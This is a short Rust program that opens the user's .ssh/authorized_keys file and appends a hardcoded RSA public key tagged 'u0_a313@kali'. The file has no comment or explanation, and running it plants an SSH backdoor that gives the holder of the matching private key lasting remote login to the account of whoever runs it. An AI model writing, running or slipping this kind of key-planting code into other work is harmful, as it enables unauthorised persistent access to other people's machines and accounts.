use std::fs::OpenOptions;
use std::io::Write;

fn main() {
    let mut file_ref = OpenOptions::new().append(true).open(".ssh/authorized_keys").expect("unable to open file");
    file_ref.write_all("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QfdNxXs1RPPfkgn6/nlG3yw6Ezbk7e4EDHkprYWa520zMoVZYHay3NNGetDs8cSGKLE+dqS4V5avK6qPsrWmnqpjuUbxpmwgY7bgkf7S7wC830jjJJfFRagnStUXGWKo0ZRGZk44pT8qWaQLoEpymoDk8I/Jg6DWAAYXbFUXcNg3Affc2l7AR6TkBc3ljEuCNI+7+n3YW0DdhW6XNl2FuJslW4pldDmFo/FZ9wMqth8A3dfH0dfOgCIGUMAiKAOsXaHte+1OnJN8GL8uRgjrF/FKxF09tc3R03BllLXGCHYXSiAjDtB4fCiwCPxs+EYbeHGMeKcPDqaPovaMv9PbwSmhqxUZrAtN0uhsHZtUs8h/d2QJ0MGL27D6a5Z+sULvBkk72BWH7TfrC1zM+suxSnzLWY+6nhWUHjNeVrXHCtXNmGWPh8BiMKP6TvIHw78q5a7W6pffThJTPy8vNFfPLGBaBqETUCZFBHwY14SNHVKBO7JRHZ26/JshRikjobU= u0_a313@kali\n".as_bytes()).expect("write failed");
}
